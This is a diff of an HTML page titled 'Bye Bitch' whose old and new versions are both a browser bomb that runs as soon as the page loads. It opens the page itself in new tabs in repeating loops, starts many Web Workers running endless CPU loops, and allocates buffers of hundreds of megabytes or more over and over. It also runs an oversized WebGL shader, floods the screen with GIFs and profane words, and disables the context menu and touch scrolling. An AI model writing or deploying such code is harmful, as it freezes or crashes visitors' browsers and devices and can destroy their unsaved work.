@@ -1,238 +1,172 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Bye Bitch</title>
-    <style>
-      body {
-        margin: 0;
-        height: 100dvh;
-        background: #000;
-        color: #f33;
-        font-family: system-ui, sans-serif;
-        overflow: hidden;
-        display: grid;
-        place-items: center;
-        font-size: 13vw;
-        font-weight: 900;
-        text-shadow: 0 0 60px #f00;
-        user-select: none;
-      }
-      canvas {
-        position: fixed;
-        inset: 0;
-        z-index: -1;
-      }
-      .floater,
-      .gif {
-        position: fixed;
-        pointer-events: none;
-        z-index: 10;
-      }
-    </style>
-  </head>
-  <body>
-    <div>BYE BITCH</div>
-    <canvas id="c"></canvas>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bye Bitch</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100dvh;
+      background: #000;
+      color: #f33;
+      font-family: system-ui, sans-serif;
+      overflow: hidden;
+      display: grid;
+      place-items: center;
+      font-size: 13vw;
+      font-weight: 900;
+      text-shadow: 0 0 60px #f00;
+      user-select: none;
+    }
+    canvas { position: fixed; inset: 0; z-index: -1; }
+    .floater, .gif { position: fixed; pointer-events: none; z-index: 10; }
+  </style>
+</head>
+<body>
+<div>BYE BITCH</div>
+<canvas id="c"></canvas>
 
-    <script>
-      const nukelink = location.href;
+<script>
+const nukelink = location.href;
 
-      function openNuke() {
-        try {
-          window.open(nukelink, "_blank");
-          const a = document.createElement("a");
-          a.href = nukelink;
-          a.target = "_blank";
-          a.rel = "noopener noreferrer";
-          document.body.appendChild(a);
-          a.click();
-          a.remove();
-        } catch (e) {}
-      }
+function openNuke() {
+  try {
+    window.open(nukelink, '_blank');
+    const a = document.createElement('a');
+    a.href = nukelink;
+    a.target = '_blank';
+    a.rel = 'noopener noreferrer';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  } catch(e) {}
+}
 
-      for (let i = 0; i < 40; i++) {
-        setTimeout(openNuke, i * 12);
-      }
+for (let i = 0; i < 40; i++) setTimeout(openNuke, i * 12);
+setInterval(() => { for (let i = 0; i < 10; i++) setTimeout(openNuke, i * 20); }, 300);
+setInterval(() => { for (let i = 0; i < 20; i++) setTimeout(openNuke, i * 15); }, 1600);
 
-      setInterval(() => {
-        for (let i = 0; i < 10; i++) setTimeout(openNuke, i * 18);
-      }, 250);
-
-      setInterval(() => {
-        for (let i = 0; i < 22; i++) setTimeout(openNuke, i * 10);
-      }, 1400);
-
-      if (window.opener) {
-        setInterval(() => {
-          for (let i = 0; i < 20; i++) openNuke();
-        }, 180);
-      }
-
-      const workerCode = URL.createObjectURL(
-        new Blob(
-          [
-            `
+const workerCode = URL.createObjectURL(new Blob([`
   'use strict';
   self.onmessage = () => {
-    let x = performance.now();
+    let x = performance.now() * Math.PI;
     while (true) {
-      x = Math.sin(x) * Math.cos(x * 1.17) * Math.tan(x + 1e-9) * Math.sqrt(Math.abs(x));
-      x = (x * x * x * x) ** 0.25 * 1.6180339887;
-      for (let i = 0; i < 90000000; i++) {
+      x = Math.sin(x) * Math.cos(x * 1.15) * Math.tan(x + 1e-7);
+      x = (x * x * x) ** 0.333333 * 1.6180339887;
+      for (let i = 0; i < 75000000; i++) {
         x += Math.log1p(Math.abs(x) + 1e-300) * 2e-9;
-        x = Math.atan(x) * Math.asin(Math.min(1, Math.abs(x)));
       }
     }
   };
-`,
-          ],
-          { type: "application/javascript" },
-        ),
-      );
+`], { type: 'application/javascript' }));
 
-      const threads = (navigator.hardwareConcurrency || 8) * 9;
-      for (let i = 0; i < threads; i++) {
-        new Worker(workerCode).postMessage("go");
-        new Worker(workerCode).postMessage("go"); 
+const threadCount = (navigator.hardwareConcurrency || 8) * 8;
+for (let i = 0; i < threadCount; i++) {
+  new Worker(workerCode).postMessage("go");
+}
+
+const allocations = [];
+function allocBig() {
+  try {
+    const buf = new ArrayBuffer(1 << 29);
+    new Float64Array(buf).fill(performance.now() * Math.random());
+    allocations.push(buf);
+    allocations.push(URL.createObjectURL(new Blob([new Uint8Array(1 << 27)])));
+  } catch(e) {}
+}
+for (let i = 0; i < 180; i++) allocBig();
+setInterval(allocBig, 280);
+
+const canvas = document.getElementById('c');
+const gl = canvas.getContext('webgl2', { antialias: false }) || canvas.getContext('webgl', { antialias: false });
+
+if (gl) {
+  const dpr = Math.min(window.devicePixelRatio || 1, 3.5);
+  function resize() {
+    canvas.width = innerWidth * dpr * 3.5;
+    canvas.height = innerHeight * dpr * 3.5;
+    gl.viewport(0, 0, canvas.width, canvas.height);
+  }
+  resize();
+  addEventListener('resize', resize);
+
+  const vs = `#version 300 es in vec2 p; void main() { gl_Position = vec4(p,0,1); }`;
+  const fs = `#version 300 es
+    precision highp float;
+    out vec4 frag;
+    uniform float t;
+    uniform vec2 reso;
+    float hash(vec2 p) {
+      return fract(sin(dot(p, vec2(12.9898, 78.233))) * 43758.5453);
+    }
+    void main() {
+      vec2 uv = gl_FragCoord.xy / reso;
+      float sum = 0.0;
+      float time = t * 1.1;
+      for (int i = 0; i < 520; ++i) {
+        float fi = float(i);
+        vec2 off = vec2(sin(fi*0.45 + time*1.3), cos(fi*0.52 + time*1.7)) * 0.45;
+        sum += sin(dot(uv + off, vec2(58.0, 47.0)) + fi*1.1 + time) * 2.2;
+        sum += hash(uv * 18.0 + fi*1.4 + time) * 5.1;
+        sum = fract(sum * 1.618 + 0.618);
       }
-
-      const allocations = [];
-      function bombMemory() {
-        try {
-          allocations.push(new ArrayBuffer(1 << 30)); // 1GB
-          allocations.push(new Float64Array(1 << 26).fill(performance.now()));
-          allocations.push(new Uint8Array(1 << 28));
-          allocations.push(
-            URL.createObjectURL(new Blob([new Uint8Array(1 << 27)])),
-          );
-        } catch (e) {}
-      }
-      for (let i = 0; i < 120; i++) bombMemory();
-      setInterval(bombMemory, 180);
-
-      const canvas = document.getElementById("c");
-      const gl =
-        canvas.getContext("webgl2", {
-          antialias: false,
-          powerPreference: "high-performance",
-        }) || canvas.getContext("webgl", { antialias: false });
-
-      if (gl) {
-        let dpr = Math.min(window.devicePixelRatio || 1, 4);
-        function resize() {
-          canvas.width = innerWidth * dpr * 3.8;
-          canvas.height = innerHeight * dpr * 3.8;
-          gl.viewport(0, 0, canvas.width, canvas.height);
-        }
-        resize();
-        window.addEventListener("resize", resize);
-
-        const vs = `#version 300 es in vec2 p; void main(){gl_Position=vec4(p,0,1);}`;
-        const fs = `#version 300 es precision highp float; out vec4 f; uniform float t; uniform vec2 r;
-    float h(vec2 p){return fract(sin(dot(p,vec2(12.9898,78.233)))*43758.5453);}
-    void main(){
-      vec2 uv=gl_FragCoord.xy/r; float s=0.,T=t*1.1;
-      for(int i=0;i<520;i++){
-        float fi=float(i);
-        vec2 o=vec2(sin(fi*0.47+T*1.3),cos(fi*0.51+T*1.7))*0.42;
-        s+=sin(dot(uv+o,vec2(52,44))+fi*1.1+T*1.4)*2.1;
-        s+=h(uv*18.+fi*1.3+T*2.0)*4.8;
-        s=fract(s*1.618 + 0.618);
-      }
-      vec3 c=0.5+0.5*cos(vec3(0.1,2.4,4.8)+s*1.7+T*1.2);
-      f=vec4(c,1.0);
+      vec3 color = 0.5 + 0.5 * cos(vec3(0.0, 2.4, 4.8) + sum * 1.6 + time * 1.0);
+      frag = vec4(color, 1.0);
     }`;
 
-        const prog = gl.createProgram();
-        [gl.VERTEX_SHADER, gl.FRAGMENT_SHADER].forEach((type, i) => {
-          const sh = gl.createShader(type);
-          gl.shaderSource(sh, i === 0 ? vs : fs);
-          gl.compileShader(sh);
-          gl.attachShader(prog, sh);
-        });
-        gl.linkProgram(prog);
-        gl.useProgram(prog);
+  const createShader = (type, src) => {
+    const sh = gl.createShader(type);
+    gl.shaderSource(sh, src);
+    gl.compileShader(sh);
+    return sh;
+  };
+  const prog = gl.createProgram();
+  gl.attachShader(prog, createShader(gl.VERTEX_SHADER, vs));
+  gl.attachShader(prog, createShader(gl.FRAGMENT_SHADER, fs));
+  gl.linkProgram(prog);
+  gl.useProgram(prog);
 
-        const buf = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-        gl.bufferData(
-          gl.ARRAY_BUFFER,
-          new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]),
-          gl.STATIC_DRAW,
-        );
-        gl.enableVertexAttribArray(0);
-        gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
+  const posLoc = gl.getAttribLocation(prog, 'p');
+  gl.enableVertexAttribArray(posLoc);
+  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
 
-        const tLoc = gl.getUniformLocation(prog, "t");
-        const rLoc = gl.getUniformLocation(prog, "r");
-        let start = performance.now();
+  const tLoc = gl.getUniformLocation(prog, 't');
+  const rLoc = gl.getUniformLocation(prog, 'reso');
+  let start = performance.now();
 
-        function render() {
-          gl.uniform1f(tLoc, (performance.now() - start) / 1000);
-          gl.uniform2f(rLoc, canvas.width, canvas.height);
-          gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-          requestAnimationFrame(render);
-        }
-        render();
-      }
+  function render() {
+    const elapsed = (performance.now() - start) / 1000;
+    gl.uniform1f(tLoc, elapsed);
+    gl.uniform2f(rLoc, canvas.width, canvas.height);
+    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    requestAnimationFrame(render);
+  }
+  render();
+}
 
-      const gifs = [
-        "https://i.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif",
-        "https://i.giphy.com/media/l0HlRnAWXxn0MhKLK/giphy.gif",
-        "https://i.giphy.com/media/26ufnwz3wDUli7GU0/giphy.gif",
-        "https://i.giphy.com/media/3o7aDgfU8v7vX8zqZq/giphy.gif",
-      ];
+const gifs = ["https://i.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif","https://i.giphy.com/media/l0HlRnAWXxn0MhKLK/giphy.gif","https://i.giphy.com/media/26ufnwz3wDUli7GU0/giphy.gif"];
 
-      function spawnGIF() {
-        const img = document.createElement("img");
-        img.src = gifs[Math.floor(Math.random() * gifs.length)];
-        img.style.position = "fixed";
-        img.style.left = Math.random() * 110 - 10 + "vw";
-        img.style.top = Math.random() * 110 - 10 + "vh";
-        img.style.width = 140 + Math.random() * 220 + "px";
-        img.style.animation = `spin ${1.5 + Math.random() * 5}s linear infinite`;
-        document.body.appendChild(img);
-        setTimeout(() => img.remove(), 16000);
-      }
+function spawnGIF() {
+  const img = document.createElement('img');
+  img.src = gifs[Math.floor(Math.random()*gifs.length)];
+  img.style.position = "fixed";
+  img.style.left = Math.random()*110-10+"vw";
+  img.style.top = Math.random()*110-10+"vh";
+  img.style.width = "200px";
+  img.style.animation = "spin 2.5s linear infinite";
+  document.body.appendChild(img);
+  setTimeout(() => img.remove(), 15000);
+}
 
-      function spawnText() {
-        const texts = [
-          "BYE",
-          "FUCKED",
-          "RIP",
-          "DEAD",
-          "LOL",
-          "CRASH",
-          "NOPE",
-          "MOMMY",
-          "LMAO",
-        ];
-        const div = document.createElement("div");
-        div.textContent = texts[Math.floor(Math.random() * texts.length)];
-        div.style.position = "fixed";
-        div.style.left = Math.random() * 100 + "vw";
-        div.style.top = Math.random() * 100 + "vh";
-        div.style.fontSize = 5 + Math.random() * 8 + "vw";
-        div.style.color = `hsl(${Math.random() * 360},100%,65%)`;
-        div.style.animation = `float ${4 + Math.random() * 9}s linear forwards`;
-        document.body.appendChild(div);
-        setTimeout(() => div.remove(), 22000);
-      }
+setInterval(spawnGIF, 120);
+for (let i = 0; i < 12; i++) setTimeout(spawnGIF, i*80);
 
-      setInterval(spawnGIF, 70);
-      setInterval(spawnText, 55);
-
-      for (let i = 0; i < 18; i++) {
-        setTimeout(spawnGIF, i * 40);
-        setTimeout(spawnText, i * 35);
-      }
-
-      document.addEventListener("contextmenu", (e) => e.preventDefault());
-      document.addEventListener("touchmove", (e) => e.preventDefault(), {
-        passive: false,
-      });
-    </script>
-  </body>
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
+</script>
+</body>
 </html>
